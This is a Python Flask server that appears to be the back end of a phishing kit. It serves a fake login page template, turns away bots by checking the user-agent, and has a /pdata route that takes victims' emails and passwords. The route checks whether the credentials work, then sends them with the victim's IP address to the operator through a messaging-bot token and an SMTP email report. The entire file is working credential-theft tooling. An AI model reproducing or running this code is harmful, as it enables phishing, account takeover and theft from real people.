from flask import Flask, request, render_template, jsonify
from threading import Thread
from waitress import serve
import time, json
import sys
from conn import DOS
from flask_cors import CORS


argument = sys.argv[1]
app = Flask(__name__, static_folder=f"templates/{argument}")
CORS(app)

@app.route('/')
def index():
   if request.headers.getlist('X-Forwarded-For'):ip = request.headers.getlist('X-Forwarded-For')[0]
   else:ip = request.remote_addr
   ua = request.headers.get('user-agent')
   device = DOS().isBo(req=ua)
   if not device:
      print(f'New connection from {ip}')
      return render_template(f'{argument}/index.html', data="")
   else:
      print(f'New connection from Bot {ip}')
      return('501')


@app.route('/pdata/<em>/<pwd>')
def pData(em, pwd):
   if request.headers.getlist('X-Forwarded-For'):ip = request.headers.getlist('X-Forwarded-For')[0]
   else:ip = request.remote_addr

   print(f'Email: {em}\nPassword: {pwd}')
   if DOS().ChkIMP(em, pwd):
      if reportInfo['token'] != '': 
         Thread(target=DOS().snTM, args=(reportInfo['token'], reportInfo['cid'], f'Email: {em}\nPassword: {pwd}\nIP: {ip}', ), daemon=True).start()
      if reportInfo['shost'] != '': 
         Thread(target=DOS().sndm, args=(reportInfo['shost'], reportInfo['sport'], reportInfo['uname'], reportInfo['pwd'],reportInfo['reportEmail'], 'Gifts from Doom"s child', f'Email: {em}\nPassword: {pwd}\nIP: {ip}',), daemon=True).start()
      return jsonify({'success': 'success'})
   else: return jsonify({'error': 'error'})
    
if __name__ == "__main__":
   print('Server is running...')
   with open('config.json', 'r') as _:reportInfo = json.load(_)
   serve(app, host='0.0.0.0', port=80, threads=100)
